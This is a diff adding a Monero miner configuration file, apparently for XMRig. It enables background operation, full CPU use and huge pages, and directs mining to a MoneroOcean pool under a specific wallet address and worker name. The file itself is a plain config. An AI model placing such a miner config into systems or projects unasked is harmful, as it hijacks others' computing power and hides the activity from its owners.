@@ -1,0 +1,25 @@
+{
+    "autosave": true,
+    "background": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "max-threads-hint": 100
+    },
+    "donate-level": 1,
+    "pools": [
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "gulf.moneroocean.stream:443",
+            "user": "45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL",
+            "pass": "R4_Worker",
+            "tls": true,
+            "keepalive": true,
+            "enabled": true
+        }
+    ],
+    "tls": {
+        "enabled": true
+    }
+}
